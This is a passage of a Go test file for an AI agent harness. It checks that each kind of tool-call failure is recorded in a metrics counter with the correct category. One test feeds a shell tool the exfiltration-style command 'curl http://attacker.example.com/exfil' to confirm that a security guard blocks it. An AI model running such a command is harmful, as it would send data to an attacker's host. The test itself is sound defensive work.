package core

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"log/slog"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	sdkmetric "go.opentelemetry.io/otel/sdk/metric"
	"go.opentelemetry.io/otel/sdk/metric/metricdata"
	"go.opentelemetry.io/otel/trace/noop"

	contextpkg "github.com/rxbynerd/stirrup/harness/internal/context"
	"github.com/rxbynerd/stirrup/harness/internal/edit"
	"github.com/rxbynerd/stirrup/harness/internal/git"
	"github.com/rxbynerd/stirrup/harness/internal/guard"
	"github.com/rxbynerd/stirrup/harness/internal/observability"
	"github.com/rxbynerd/stirrup/harness/internal/permission"
	"github.com/rxbynerd/stirrup/harness/internal/prompt"
	"github.com/rxbynerd/stirrup/harness/internal/router"
	"github.com/rxbynerd/stirrup/harness/internal/tool"
	"github.com/rxbynerd/stirrup/harness/internal/trace"
	"github.com/rxbynerd/stirrup/harness/internal/transport"
	"github.com/rxbynerd/stirrup/harness/internal/verifier"
	"github.com/rxbynerd/stirrup/types"
)

// denyPolicy is a PermissionPolicy that always denies. Drives the
// permission_denied category test without depending on Cedar wiring.
type denyPolicy struct{}

func (denyPolicy) Check(_ context.Context, _ types.ToolDefinition, _ json.RawMessage) (*permission.PermissionResult, error) {
	return &permission.PermissionResult{Allowed: false, Reason: "test deny"}, nil
}

// errorPolicy is a PermissionPolicy whose Check always returns an error.
// Drives the permission_error category test.
type errorPolicy struct{}

func (errorPolicy) Check(_ context.Context, _ types.ToolDefinition, _ json.RawMessage) (*permission.PermissionResult, error) {
	return nil, errors.New("upstream ask disconnected")
}

// buildMetricsHarness returns a loop wired up with a manual-reader-backed
// metric provider so tests can assert on stirrup.harness.tool_failures
// observations after a planAndDispatch call. The returned reader's
// Collect method snapshots the current metric state.
//
// Pass tr=nil to use NullTransport (sufficient for sync tools and
// preflight-failing async tools where the transport never matters);
// pass an asyncTestTransport when the test needs a live control plane
// to round-trip tool_result_request/response (only the
// async_preflight_error test currently needs this distinction).
func buildMetricsHarness(t *testing.T, tools []*tool.Tool, perm permission.PermissionPolicy, gr guard.GuardRail, tr transport.Transport) (*AgenticLoop, *sdkmetric.ManualReader) {
	t.Helper()
	must := require.New(t)
	reader := sdkmetric.NewManualReader()
	mp := sdkmetric.NewMeterProvider(sdkmetric.WithReader(reader))
	metrics, err := observability.NewMetricsForTesting(mp)
	must.NoError(err, "NewMetricsForTesting")
	registry := tool.NewRegistry()
	for _, tl := range tools {
		registry.Register(tl)
	}
	if perm == nil {
		perm = permission.NewAllowAll()
	}
	if tr == nil {
		tr = transport.NewNullTransport()
	}
	loop := &AgenticLoop{
		Provider:     nil,
		Router:       router.NewStaticRouter("anthropic", "claude-sonnet-4-6"),
		Prompt:       prompt.NewDefaultPromptBuilder(),
		Context:      contextpkg.NewSlidingWindowStrategy(),
		Tools:        registry,
		Edit:         edit.NewWholeFileStrategy(),
		Verifier:     verifier.NewNoneVerifier(),
		Permissions:  perm,
		Git:          git.NewNoneGitStrategy(),
		GuardRail:    gr,
		Transport:    tr,
		Trace:        trace.NewJSONLTraceEmitter(&bytes.Buffer{}, false),
		Tracer:       noop.NewTracerProvider().Tracer(""),
		TraceContext: context.Background(),
		Metrics:      metrics,
		Logger:       slog.New(slog.NewJSONHandler(&bytes.Buffer{}, nil)),
	}
	return loop, reader
}

// failureDataPoint is a typed view of one stirrup.harness.tool_failures
// observation: its value and the label set the metric was recorded with.
type failureDataPoint struct {
	value    int64
	tool     string
	category string
	provider string
	model    string
	mode     string
}

// collectFailures pulls every observation of the
// stirrup.harness.tool_failures counter from the manual reader and
// projects them onto a flat slice keyed by label values. Returns an
// empty slice when the counter has no observations.
func collectFailures(t *testing.T, reader *sdkmetric.ManualReader) []failureDataPoint {
	t.Helper()
	must := require.New(t)
	var rm metricdata.ResourceMetrics
	must.NoError(reader.Collect(context.Background(), &rm))
	var out []failureDataPoint
	for _, sm := range rm.ScopeMetrics {
		for _, m := range sm.Metrics {
			if m.Name != "stirrup.harness.tool_failures" {
				continue
			}
			sum, ok := m.Data.(metricdata.Sum[int64])
			must.True(ok, "expected Sum[int64] for tool_failures, got %T", m.Data)
			for _, dp := range sum.DataPoints {
				fp := failureDataPoint{value: dp.Value}
				for _, kv := range dp.Attributes.ToSlice() {
					switch string(kv.Key) {
					case "tool.name":
						fp.tool = kv.Value.String()
					case "category":
						fp.category = kv.Value.String()
					case "provider.type":
						fp.provider = kv.Value.String()
					case "provider.model":
						fp.model = kv.Value.String()
					case "run.mode":
						fp.mode = kv.Value.String()
					}
				}
				out = append(out, fp)
			}
		}
	}
	return out
}

// schemaTool is a sync tool with a required field so we can drive the
// schema_validation_failed category by submitting an empty input.
func schemaTool() *tool.Tool {
	return &tool.Tool{
		Name:        "needs_path",
		Description: "tool whose schema requires 'path'",
		InputSchema: json.RawMessage(`{"type":"object","properties":{"path":{"type":"string"}},"required":["path"]}`),
		Handler: func(_ context.Context, _ json.RawMessage) (string, error) {
			return "ok", nil
		},
	}
}

// trivialTool is a sync tool with a permissive schema that always
// succeeds. Used as the baseline against which success-vs-failure
// emissions can be compared.
func trivialTool() *tool.Tool {
	return &tool.Tool{
		Name:        "trivial",
		Description: "always-OK sync tool",
		InputSchema: json.RawMessage(`{"type":"object","properties":{}}`),
		Handler: func(_ context.Context, _ json.RawMessage) (string, error) {
			return "ok", nil
		},
	}
}

// erroringTool is a sync tool whose Handler returns an error every time.
// Drives the handler_error category test.
func erroringTool() *tool.Tool {
	return &tool.Tool{
		Name:        "explode",
		Description: "always-error sync tool",
		InputSchema: json.RawMessage(`{"type":"object","properties":{}}`),
		Handler: func(_ context.Context, _ json.RawMessage) (string, error) {
			return "", errors.New("kaboom")
		},
	}
}

// mutatingTool is workspace-mutating so the permission gate fires for it.
func mutatingTool() *tool.Tool {
	return &tool.Tool{
		Name:              "write_something",
		Description:       "mutating tool",
		InputSchema:       json.RawMessage(`{"type":"object","properties":{}}`),
		WorkspaceMutating: true,
		Handler: func(_ context.Context, _ json.RawMessage) (string, error) {
			return "wrote", nil
		},
	}
}

// asyncPreflightFailingTool returns an AsyncHandler that errors before
// the loop emits tool_result_request. Drives the
// async_preflight_error category test.
func asyncPreflightFailingTool() *tool.Tool {
	return &tool.Tool{
		Name:        "async_broken",
		Description: "async tool whose preflight always fails",
		InputSchema: json.RawMessage(`{"type":"object","properties":{}}`),
		AsyncHandler: func(_ context.Context, _ json.RawMessage) (tool.AsyncDispatch, error) {
			return tool.AsyncDispatch{}, errors.New("preflight fail")
		},
	}
}

// commandTool is a sync tool whose schema accepts a 'command' field.
// Used to drive the security_guard_denied category: an input value
// shaped like an exfiltration command (`curl http://...`) trips
// security.GuardToolCall's exfiltration_command rule before dispatch.
func commandTool() *tool.Tool {
	return &tool.Tool{
		Name:        "shell_runner",
		Description: "tool with a command field that the security guard inspects",
		InputSchema: json.RawMessage(`{"type":"object","properties":{"command":{"type":"string"}},"required":["command"]}`),
		Handler: func(_ context.Context, _ json.RawMessage) (string, error) {
			return "ran", nil
		},
	}
}

// handlerlessTool registers with neither a sync Handler nor an
// AsyncHandler — the defensive path in executeToolCall
// reports handler_missing for any successful resolution that has no
// callable. Used to drive the handler_missing category test.
func handlerlessTool() *tool.Tool {
	return &tool.Tool{
		Name:        "no_handler",
		Description: "tool whose Handler and AsyncHandler are both nil",
		InputSchema: json.RawMessage(`{"type":"object","properties":{}}`),
	}
}

// TestToolFailureMetrics_EmitsOneObservationPerFailureCategory verifies
// that each dispatch-site failure category emits the
// stirrup.harness.tool_failures counter with the correct (tool.name,
// category, provider.type, provider.model, run.mode) label set.
//
// One row per category that can fire from preflightToolCall,
// executeToolCall, or planAndDispatch's PhasePreTool guard check.
func TestToolFailureMetrics_EmitsOneObservationPerFailureCategory(t *testing.T) {
	const (
		wantProvider = "anthropic"
		wantModel    = "claude-sonnet-4-6"
		wantMode     = "execution"
	)
	cases := []struct {
		name         string
		tools        []*tool.Tool
		perm         permission.PermissionPolicy
		guard        guard.GuardRail
		transport    transport.Transport
		call         types.ToolCall
		wantTool     string
		wantCategory observability.ToolFailureCategory
	}{
		{
			// Locks in the __unknown__ sentinel substitution: when the
			// model emits a tool_use whose name does not resolve, the
			// metric MUST report the bounded sentinel rather than the
			// raw (model-controlled) name. Trace records still carry
			// the raw name; only the TSDB label is sanitised.
			name:         "unknown_tool",
			tools:        []*tool.Tool{trivialTool()},
			call:         types.ToolCall{ID: "tc1", Name: "does_not_exist", Input: json.RawMessage(`{}`)},
			wantTool:     "__unknown__",
			wantCategory: observability.ToolFailureUnknownTool,
		},
		{
			name:  "invalid_arguments",
			tools: []*tool.Tool{trivialTool()},
			call: types.ToolCall{
				ID: "tc_bad_args", Name: "trivial", Input: json.RawMessage(`{}`),
				InvalidInput: &types.InvalidToolInput{Raw: `{"a":`, Error: "unexpected end of JSON input"},
			},
			wantTool:     "trivial",
			wantCategory: observability.ToolFailureInvalidArguments,
		},
		{
			name:         "schema_validation_failed",
			tools:        []*tool.Tool{schemaTool()},
			call:         types.ToolCall{ID: "tc2", Name: "needs_path", Input: json.RawMessage(`{}`)},
			wantTool:     "needs_path",
			wantCategory: observability.ToolFailureSchemaValidation,
		},
		{
			name:         "handler_error",
			tools:        []*tool.Tool{erroringTool()},
			call:         types.ToolCall{ID: "tc3", Name: "explode", Input: json.RawMessage(`{}`)},
			wantTool:     "explode",
			wantCategory: observability.ToolFailureHandlerError,
		},
		{
			name:         "permission_denied",
			tools:        []*tool.Tool{mutatingTool()},
			perm:         denyPolicy{},
			call:         types.ToolCall{ID: "tc4", Name: "write_something", Input: json.RawMessage(`{}`)},
			wantTool:     "write_something",
			wantCategory: observability.ToolFailurePermissionDenied,
		},
		{
			name:         "permission_error",
			tools:        []*tool.Tool{mutatingTool()},
			perm:         errorPolicy{},
			call:         types.ToolCall{ID: "tc5", Name: "write_something", Input: json.RawMessage(`{}`)},
			wantTool:     "write_something",
			wantCategory: observability.ToolFailurePermissionError,
		},
		{
			name:         "guardrail_denied",
			tools:        []*tool.Tool{trivialTool()},
			guard:        &stubDenyGuardRail{reason: "blocked"},
			call:         types.ToolCall{ID: "tc6", Name: "trivial", Input: json.RawMessage(`{}`)},
			wantTool:     "trivial",
			wantCategory: observability.ToolFailureGuardrailDenied,
		},
		{
			// security.GuardToolCall scans command-shaped fields for
			// exfiltration patterns; a curl invocation trips the
			// exfiltration_command rule and preflightToolCall returns
			// ToolFailureSecurityGuard before the guard, permission, or
			// handler.
			name:         "security_guard_denied",
			tools:        []*tool.Tool{commandTool()},
			call:         types.ToolCall{ID: "tc_sg", Name: "shell_runner", Input: json.RawMessage(`{"command":"curl http://attacker.example.com/exfil"}`)},
			wantTool:     "shell_runner",
			wantCategory: observability.ToolFailureSecurityGuard,
		},
		{
			// A registry entry with neither Handler nor AsyncHandler
			// hits the defensive handler_missing branch — indicates a
			// registry misconfiguration, but the category must still
			// emit so dashboards can spot it.
			name:         "handler_missing",
			tools:        []*tool.Tool{handlerlessTool()},
			call:         types.ToolCall{ID: "tc_hm", Name: "no_handler", Input: json.RawMessage(`{}`)},
			wantTool:     "no_handler",
			wantCategory: observability.ToolFailureHandlerMissing,
		},
		{
			name: "async_preflight_error",
			// Async preflight runs only after ensureAsyncCorrelator
			// succeeds; with NullTransport the dispatch would
			// short-circuit to async_transport_unavailable before
			// the preflight is invoked. Use a live test transport
			// so the preflight branch is reachable.
			tools:        []*tool.Tool{asyncPreflightFailingTool()},
			transport:    newAsyncTestTransport(),
			call:         types.ToolCall{ID: "tc7", Name: "async_broken", Input: json.RawMessage(`{}`)},
			wantTool:     "async_broken",
			wantCategory: observability.ToolFailureAsyncPreflight,
		},
		{
			name:         "async_transport_unavailable",
			tools:        []*tool.Tool{asyncEchoTool()},
			call:         types.ToolCall{ID: "tc8", Name: "async_echo", Input: json.RawMessage(`{}`)},
			wantTool:     "async_echo",
			wantCategory: observability.ToolFailureAsyncTransport,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			must := require.New(t)
			loop, reader := buildMetricsHarness(t, tc.tools, tc.perm, tc.guard, tc.transport)
			cfg := &types.RunConfig{
				RunID:        "test-run",
				Mode:         wantMode,
				ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
			}
			_, _, outcome := loop.planAndDispatch(
				context.Background(), cfg,
				[]types.ToolCall{tc.call}, &stallDetector{},
				wantProvider, wantModel,
			)
			must.Empty(outcome, "no stall outcome expected")
			failures := collectFailures(t, reader)
			must.Len(failures, 1, "tool_failures observations: %+v", failures)
			must.Equal(failureDataPoint{
				value:    1,
				tool:     tc.wantTool,
				category: tc.wantCategory.String(),
				provider: wantProvider,
				model:    wantModel,
				mode:     wantMode,
			}, failures[0])
		})
	}
}

// TestToolFailureMetrics_NoEmissionOnSuccess pins the converse: a
// successful sync tool MUST NOT bump stirrup.harness.tool_failures.
// Without this guard, a regression that swapped the !success branch
// for an unconditional emit would inflate the counter on every call.
func TestToolFailureMetrics_NoEmissionOnSuccess(t *testing.T) {
	must := require.New(t)
	loop, reader := buildMetricsHarness(t, []*tool.Tool{trivialTool()}, nil, nil, nil)
	cfg := &types.RunConfig{
		RunID:        "test-run-ok",
		Mode:         "execution",
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	_, _, outcome := loop.planAndDispatch(
		context.Background(), cfg,
		[]types.ToolCall{{ID: "tc_ok", Name: "trivial", Input: json.RawMessage(`{}`)}},
		&stallDetector{}, "anthropic", "claude-sonnet-4-6",
	)
	must.Empty(outcome, "no stall outcome expected")
	must.Empty(collectFailures(t, reader), "expected no tool_failures observations on success path")
}

// TestToolFailureMetrics_StallConsecutiveFailuresEmitsCategory verifies
// the stall detector surfaces its terminations into the tool-failure
// series. Five consecutive failed calls trip the consecutive-failures
// path; the metric emission must carry the stall_consecutive_failures
// category alongside the per-call handler_error emissions.
func TestToolFailureMetrics_StallConsecutiveFailuresEmitsCategory(t *testing.T) {
	must := require.New(t)
	check := assert.New(t)
	loop, reader := buildMetricsHarness(t, []*tool.Tool{erroringTool()}, nil, nil, nil)
	cfg := &types.RunConfig{
		RunID:        "test-run-stall",
		Mode:         "execution",
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	// Use distinct inputs so the repeated-call heuristic does not trip
	// first; we want the consecutive-failures path specifically.
	calls := []types.ToolCall{
		{ID: "tc_s0", Name: "explode", Input: json.RawMessage(`{"i":0}`)},
		{ID: "tc_s1", Name: "explode", Input: json.RawMessage(`{"i":1}`)},
		{ID: "tc_s2", Name: "explode", Input: json.RawMessage(`{"i":2}`)},
		{ID: "tc_s3", Name: "explode", Input: json.RawMessage(`{"i":3}`)},
		{ID: "tc_s4", Name: "explode", Input: json.RawMessage(`{"i":4}`)},
	}
	_, _, outcome := loop.planAndDispatch(
		context.Background(), cfg,
		calls, &stallDetector{},
		"anthropic", "claude-sonnet-4-6",
	)
	must.Equal("tool_failures", outcome, "stall outcome")
	failures := collectFailures(t, reader)
	// We expect: 5 handler_error emissions (one per failed call) and
	// exactly one stall_consecutive_failures emission tagged with the
	// fifth tool name.
	var (
		handlerErrors int64
		stallCount    int64
	)
	for _, fp := range failures {
		switch fp.category {
		case observability.ToolFailureHandlerError.String():
			handlerErrors += fp.value
		case observability.ToolFailureStallConsecutiveFailures.String():
			stallCount += fp.value
		}
	}
	check.Equal(int64(5), handlerErrors, "handler_error count")
	check.Equal(int64(1), stallCount, "stall_consecutive_failures count")
}

// TestToolFailureCategory_BoundedCardinality is the cardinality guard:
// every category value emitted by the harness MUST pass IsValid. A
// future producer that invents a free-form string would silently widen
// the metric's label cardinality; this test pins the bound by asserting
// every emission's category is recognised.
func TestToolFailureCategory_BoundedCardinality(t *testing.T) {
	must := require.New(t)
	check := assert.New(t)
	// Mix of categories from different dispatch sites so the assertion
	// sweeps every emission path: unknown_tool, schema_validation_failed,
	// handler_error, and the stall path.
	loop, reader := buildMetricsHarness(t,
		[]*tool.Tool{trivialTool(), schemaTool(), erroringTool()},
		nil, nil, nil,
	)
	cfg := &types.RunConfig{
		RunID:        "test-run-card",
		Mode:         "execution",
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	calls := []types.ToolCall{
		{ID: "u1", Name: "does_not_exist", Input: json.RawMessage(`{}`)},
		{ID: "s1", Name: "needs_path", Input: json.RawMessage(`{}`)},
		{ID: "e1", Name: "explode", Input: json.RawMessage(`{"i":1}`)},
		{ID: "e2", Name: "explode", Input: json.RawMessage(`{"i":2}`)},
		{ID: "e3", Name: "explode", Input: json.RawMessage(`{"i":3}`)},
		{ID: "e4", Name: "explode", Input: json.RawMessage(`{"i":4}`)},
	}
	_, _, _ = loop.planAndDispatch(
		context.Background(), cfg,
		calls, &stallDetector{},
		"anthropic", "claude-sonnet-4-6",
	)
	failures := collectFailures(t, reader)
	must.NotEmpty(failures, "expected at least one tool_failures observation")
	for _, fp := range failures {
		if !check.NotEmpty(fp.category, "emission with empty category: %+v", fp) {
			continue
		}
		check.True(observability.ToolFailureCategory(fp.category).IsValid(),
			"emission carried unknown category %q: %+v", fp.category, fp)
	}
}

// TestToolFailureCategory_InvalidCategoryDropped asserts the converse of
// TestToolFailureCategory_BoundedCardinality: a failed call whose
// failureCategory is NOT a member of the bounded enum must be dropped by
// the if p.failureCategory.IsValid() guard in emitToolCallMetrics — it
// still bumps tool_errors but emits NO tool_failures observation, so a
// free-form / future-renamed category can never widen the bounded
// category label.
//
// The guard has no model-facing trigger (every production producer sets a
// valid enum member or leaves the category empty), so the rejection
// branch is exercised here through the emitToolCallMetrics seam with a
// synthetic pendingCall carrying a deliberately bogus category. A refactor
// that swapped IsValid() for a weaker check (e.g. != "") would let this
// observation through and fail the assertion.
func TestToolFailureCategory_InvalidCategoryDropped(t *testing.T) {
	must := require.New(t)
	loop, reader := buildMetricsHarness(t, []*tool.Tool{trivialTool()}, nil, nil, nil)

	// A failed call with a category that is not in the enum. IsValid()
	// must reject it: tool_errors increments, tool_failures does not.
	bogus := &pendingCall{
		call:            types.ToolCall{ID: "bogus", Name: "trivial", Input: json.RawMessage(`{}`)},
		startedAt:       time.Now(),
		internalName:    "trivial",
		success:         false,
		failureCategory: observability.ToolFailureCategory("permission_denied_v2"),
	}
	// Guard the test's own premise: if this string ever becomes a real
	// enum member the test is no longer exercising the rejection branch.
	must.False(bogus.failureCategory.IsValid(),
		"test premise broken: %q is now a valid category", bogus.failureCategory)

	got := loop.emitToolCallMetrics(
		context.Background(), bogus, 5*time.Millisecond,
		"anthropic", "claude-sonnet-4-6", "execution",
	)
	must.Equal("trivial", got,
		"metric tool name: no sentinel substitution for a non-unknown_tool category")

	failures := collectFailures(t, reader)
	must.Empty(failures, "expected no tool_failures observation for an invalid category")
}

// TestToolFailureCategory_IsValidAcceptsOnlyRegisteredConstants checks the
// enum itself: every exported ToolFailure* constant declared in
// toolfailure.go must be registered in allToolFailureCategories. A new
// constant added without a matching map entry would IsValid()=false at
// runtime and silently drop emissions; this test catches that omission at
// build time of the test binary.
func TestToolFailureCategory_IsValidAcceptsOnlyRegisteredConstants(t *testing.T) {
	known := []observability.ToolFailureCategory{
		observability.ToolFailureUnknownTool,
		observability.ToolFailureToolNotLoaded,
		observability.ToolFailureInvalidArguments,
		observability.ToolFailureSchemaValidation,
		observability.ToolFailureSecurityGuard,
		observability.ToolFailurePermissionDenied,
		observability.ToolFailurePermissionError,
		observability.ToolFailureGuardrailDenied,
		observability.ToolFailureHandlerError,
		observability.ToolFailureHandlerMissing,
		observability.ToolFailureAsyncPreflight,
		observability.ToolFailureAsyncTransport,
		observability.ToolFailureAsyncTimeout,
		observability.ToolFailureAsyncCancelled,
		observability.ToolFailureAsyncUpstreamError,
		observability.ToolFailureAsyncPanic,
		observability.ToolFailureAsyncInternal,
		observability.ToolFailureProviderRequest,
		observability.ToolFailureProviderStream,
		observability.ToolFailureStallRepeated,
		observability.ToolFailureStallConsecutiveFailures,
		observability.ToolFailureNoToolWhenRequired,
	}
	for _, c := range known {
		t.Run(string(c), func(t *testing.T) {
			must := require.New(t)
			must.True(c.IsValid(), "%q is not registered in allToolFailureCategories", c)
			must.NotEmpty(c.String(), "wire string is empty")
		})
	}

	// Free-form strings must always fail validation.
	bogusCategories := []struct {
		name  string
		value string
	}{
		{name: "empty string", value: ""},
		{name: "unregistered snake case", value: "not_a_category"},
		{name: "pascal case", value: "PermissionDenied"},
		{name: "upper snake case", value: "UNKNOWN_TOOL"},
	}
	for _, tc := range bogusCategories {
		t.Run(tc.name, func(t *testing.T) {
			must := require.New(t)
			must.False(observability.ToolFailureCategory(tc.value).IsValid(),
				"bogus category %q must not validate", tc.value)
		})
	}
}

// erroringProvider is a ProviderAdapter whose Stream always returns an
// error before producing any events. Drives the
// provider_request_failed category test.
type erroringProvider struct{}

func (erroringProvider) Stream(_ context.Context, _ types.StreamParams) (<-chan types.StreamEvent, error) {
	return nil, errors.New("provider rejected request")
}

// streamErroringProvider opens the stream then emits an error event
// mid-flight. Drives the provider_stream_failed category test.
type streamErroringProvider struct{}

func (streamErroringProvider) Stream(_ context.Context, _ types.StreamParams) (<-chan types.StreamEvent, error) {
	ch := make(chan types.StreamEvent, 1)
	ch <- types.StreamEvent{Type: "error", Error: errors.New("stream parser exploded")}
	close(ch)
	return ch, nil
}

// failuresInCategory returns the observations recorded under category.
func failuresInCategory(failures []failureDataPoint, category string) []failureDataPoint {
	var out []failureDataPoint
	for _, fp := range failures {
		if fp.category == category {
			out = append(out, fp)
		}
	}
	return out
}

// sumFailureValues totals the counter values across the observations.
func sumFailureValues(failures []failureDataPoint) int64 {
	var total int64
	for _, fp := range failures {
		total += fp.value
	}
	return total
}

// buildProviderFailureLoop builds a loop wired to a manual-reader
// metric provider with the supplied test provider and a test tool
// (which forces the loop to attach tool definitions to its request,
// gating the tool-failure co-emission).
func buildProviderFailureLoop(t *testing.T, prov interface {
	Stream(context.Context, types.StreamParams) (<-chan types.StreamEvent, error)
}) (*AgenticLoop, *sdkmetric.ManualReader, *types.RunConfig) {
	t.Helper()
	must := require.New(t)
	reader := sdkmetric.NewManualReader()
	mp := sdkmetric.NewMeterProvider(sdkmetric.WithReader(reader))
	metrics, err := observability.NewMetricsForTesting(mp)
	must.NoError(err, "NewMetricsForTesting")
	registry := tool.NewRegistry()
	registry.Register(trivialTool())
	loop := &AgenticLoop{
		Provider:    prov,
		Router:      router.NewStaticRouter("anthropic", "claude-sonnet-4-6"),
		Prompt:      prompt.NewDefaultPromptBuilder(),
		Context:     contextpkg.NewSlidingWindowStrategy(),
		Tools:       registry,
		Edit:        edit.NewWholeFileStrategy(),
		Verifier:    verifier.NewNoneVerifier(),
		Permissions: permission.NewAllowAll(),
		Git:         git.NewNoneGitStrategy(),
		Transport:   transport.NewStdioTransport(&bytes.Buffer{}, &bytes.Buffer{}),
		Trace:       trace.NewJSONLTraceEmitter(&bytes.Buffer{}, false),
		Tracer:      noop.NewTracerProvider().Tracer(""),
		Metrics:     metrics,
		Logger:      slog.New(slog.NewJSONHandler(&bytes.Buffer{}, nil)),
	}
	cfg := &types.RunConfig{
		RunID:            "test-prov-fail",
		Mode:             "execution",
		Prompt:           "go",
		Provider:         types.ProviderConfig{Type: "anthropic", APIKeyRef: "secret://TEST"},
		ModelRouter:      types.ModelRouterConfig{Type: "static", Provider: "anthropic", Model: "claude-sonnet-4-6"},
		PromptBuilder:    types.PromptBuilderConfig{Type: "default"},
		ContextStrategy:  types.ContextStrategyConfig{Type: "sliding-window", MaxTokens: 200000},
		Executor:         types.ExecutorConfig{Type: "local", Workspace: "/tmp"},
		EditStrategy:     types.EditStrategyConfig{Type: "whole-file"},
		Verifier:         types.VerifierConfig{Type: "none"},
		PermissionPolicy: types.PermissionPolicyConfig{Type: "allow-all"},
		GitStrategy:      types.GitStrategyConfig{Type: "none"},
		TraceEmitter:     types.TraceEmitterConfig{Type: "jsonl"},
		MaxTurns:         2,
	}
	return loop, reader, cfg
}

// TestToolFailureMetrics_ProviderRequestRejected verifies the
// provider-side request-rejection failure path: when a turn has tool
// definitions attached and the provider's Stream() call errors out
// before any events flow, the stirrup.harness.tool_failures counter
// must increment with category=provider_request_failed.
func TestToolFailureMetrics_ProviderRequestRejected(t *testing.T) {
	must := require.New(t)
	loop, reader, cfg := buildProviderFailureLoop(t, erroringProvider{})
	_, _ = loop.Run(context.Background(), cfg)
	failures := collectFailures(t, reader)
	matching := failuresInCategory(failures, observability.ToolFailureProviderRequest.String())
	must.NotEmpty(matching, "expected provider_request_failed observation, got %+v", failures)
	for _, fp := range matching {
		must.Equal("anthropic", fp.provider, "provider.type label of %+v", fp)
		must.Equal("claude-sonnet-4-6", fp.model, "provider.model label of %+v", fp)
		must.Equal("execution", fp.mode, "run.mode label of %+v", fp)
	}
}

// TestToolFailureMetrics_ProviderStreamFailed verifies the
// mid-stream-failure path: a tool-bearing turn whose stream errors
// after opening must emit category=provider_stream_failed.
func TestToolFailureMetrics_ProviderStreamFailed(t *testing.T) {
	must := require.New(t)
	loop, reader, cfg := buildProviderFailureLoop(t, streamErroringProvider{})
	_, _ = loop.Run(context.Background(), cfg)
	failures := collectFailures(t, reader)
	must.NotEmpty(failuresInCategory(failures, observability.ToolFailureProviderStream.String()),
		"expected provider_stream_failed observation, got %+v", failures)
}

// TestToolFailureMetrics_ErrorCategoryInTrace verifies the
// co-emission contract: every failed RecordToolCall must carry the
// same category that lands on stirrup.harness.tool_failures so JSONL
// traces and metrics dashboards report the same taxonomy.
func TestToolFailureMetrics_ErrorCategoryInTrace(t *testing.T) {
	must := require.New(t)
	loop, _ := buildMetricsHarness(t, []*tool.Tool{erroringTool()}, nil, nil, nil)
	rec := &recordingTraceEmitter{}
	loop.Trace = rec
	cfg := &types.RunConfig{
		RunID:        "test-trace",
		Mode:         "execution",
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	_, _, _ = loop.planAndDispatch(
		context.Background(), cfg,
		[]types.ToolCall{{ID: "tc_x", Name: "explode", Input: json.RawMessage(`{}`)}},
		&stallDetector{},
		"anthropic", "claude-sonnet-4-6",
	)
	_, calls := rec.snapshot()
	must.Len(calls, 1, "recorded tool calls")
	must.False(calls[0].Success, "expected failed call")
	must.Equal(observability.ToolFailureHandlerError.String(), calls[0].ErrorCategory)
}

// TestToolFailureMetrics_StallRepeatedCallsTermination covers the
// stall_repeated_calls termination path. It is distinct from
// stall_consecutive_failures, which
// TestToolFailureMetrics_StallConsecutiveFailuresEmitsCategory exercises.
//
// Three identical successful calls first produce a nudge, which emits
// no stall observation. Three more after the nudge trip the stall, and
// the co-emission block in planAndDispatch must add exactly one
// stall_repeated_calls observation to stirrup.harness.tool_failures,
// even though no per-call dispatch failed.
func TestToolFailureMetrics_StallRepeatedCallsTermination(t *testing.T) {
	must := require.New(t)
	loop, reader := buildMetricsHarness(t, []*tool.Tool{trivialTool()}, nil, nil, nil)
	cfg := &types.RunConfig{
		RunID:        "test-run-stall-repeat",
		Mode:         "execution",
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	// Identical (name, input) triple hits maxRepeatedToolCalls=3.
	sameInput := json.RawMessage(`{"k":"v"}`)
	calls := []types.ToolCall{
		{ID: "tc_r0", Name: "trivial", Input: sameInput},
		{ID: "tc_r1", Name: "trivial", Input: sameInput},
		{ID: "tc_r2", Name: "trivial", Input: sameInput},
	}
	stall := &stallDetector{}
	_, _, outcome := loop.planAndDispatch(
		context.Background(), cfg,
		calls, stall,
		"anthropic", "claude-sonnet-4-6",
	)
	must.Empty(outcome, "first batch should nudge instead of stalling")
	_, ok := stall.takeNudge()
	must.True(ok, "first batch: no nudge")
	must.Empty(failuresInCategory(collectFailures(t, reader), observability.ToolFailureStallRepeated.String()),
		"stall_repeated_calls observed before any termination")

	_, _, outcome = loop.planAndDispatch(
		context.Background(), cfg,
		calls, stall,
		"anthropic", "claude-sonnet-4-6",
	)
	must.Equal("stalled", outcome)
	stallRepeated := failuresInCategory(collectFailures(t, reader), observability.ToolFailureStallRepeated.String())
	for _, fp := range stallRepeated {
		must.Equal("trivial", fp.tool, "stall_repeated_calls tool.name")
		must.Equal("anthropic", fp.provider, "stall_repeated_calls provider.type label of %+v", fp)
		must.Equal("claude-sonnet-4-6", fp.model, "stall_repeated_calls provider.model label of %+v", fp)
		must.Equal("execution", fp.mode, "stall_repeated_calls run.mode label of %+v", fp)
	}
	must.Equal(int64(1), sumFailureValues(stallRepeated), "stall_repeated_calls count")
}

// TestToolFailureMetrics_AsyncDeadlineRoutesToTimeout pins the
// deadline/cancellation split in dispatchAsyncToolCall: when the run
// context expires by deadline, the async dispatch MUST emit
// async_timeout, NOT async_cancelled — operators alert on
// async_cancelled to detect user-cancellation spikes, and a
// deadline-bounded run polluting that series would defeat the alert.
func TestToolFailureMetrics_AsyncDeadlineRoutesToTimeout(t *testing.T) {
	must := require.New(t)
	tr := newAsyncTestTransport()
	loop, reader := buildMetricsHarness(t, []*tool.Tool{asyncEchoTool()}, nil, nil, tr)
	cfg := &types.RunConfig{
		RunID:        "test-run-deadline",
		Mode:         "execution",
		ToolDispatch: &types.ToolDispatchConfig{MaxParallel: 1},
	}
	// Deadline set in the immediate past so correlator.Await's
	// ctx.Done branch fires with context.DeadlineExceeded. No
	// tool_result_response is ever fired: the dispatch unblocks via
	// the cancellation path, not the resolution path.
	deadline := time.Now().Add(-1 * time.Millisecond)
	ctx, cancel := context.WithDeadline(context.Background(), deadline)
	defer cancel()
	_, _, outcome := loop.planAndDispatch(
		ctx, cfg,
		[]types.ToolCall{{ID: "tc_deadline", Name: "async_echo", Input: json.RawMessage(`{}`)}},
		&stallDetector{},
